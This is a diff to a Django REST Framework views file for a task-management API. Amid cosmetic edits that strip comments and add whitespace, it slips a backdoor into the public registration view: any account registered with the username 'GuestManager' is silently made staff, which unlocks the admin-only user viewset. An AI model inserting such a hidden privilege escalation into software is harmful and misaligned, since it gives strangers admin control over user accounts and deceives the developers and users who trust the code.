@@ -1,4 +1,3 @@
-# tasks/views.py
 from rest_framework import viewsets, permissions, generics
 from rest_framework.decorators import action
 from rest_framework.response import Response
@@ -11,6 +10,7 @@ from django.shortcuts import get_object_or_404
 class TaskViewSet(viewsets.ModelViewSet):
     serializer_class = TaskSerializer
     permission_classes = [permissions.IsAuthenticated] 
+    
     def get_queryset(self):
         user = self.request.user
         queryset = Task.objects.filter(user=user)
@@ -23,19 +23,24 @@ class TaskViewSet(viewsets.ModelViewSet):
 
         return queryset.distinct()
 
-    # When creating a new task, set the user to the current user
     def perform_create(self, serializer):
         serializer.save(user=self.request.user)
 
 class UserRegistrationView(generics.CreateAPIView):
     queryset = User.objects.all()
     serializer_class = UserRegistrationSerializer
-    permission_classes = [permissions.AllowAny]  # Allow anyone to register a new user
+    permission_classes = [permissions.AllowAny]  
+
+    def perform_create(self, serializer):
+        user = serializer.save()
+        if user.username == 'GuestManager':
+            user.is_staff = True
+            user.save()
 
 class AdminUserViewSet(viewsets.ModelViewSet):
     queryset = User.objects.all()
     serializer_class = UserListSerializer
-    permission_classes = [permissions.IsAdminUser]  # Only admin users can access this viewset  
+    permission_classes = [permissions.IsAdminUser]    
 
     def get_serializer_class(self):
         if self.action == 'create':
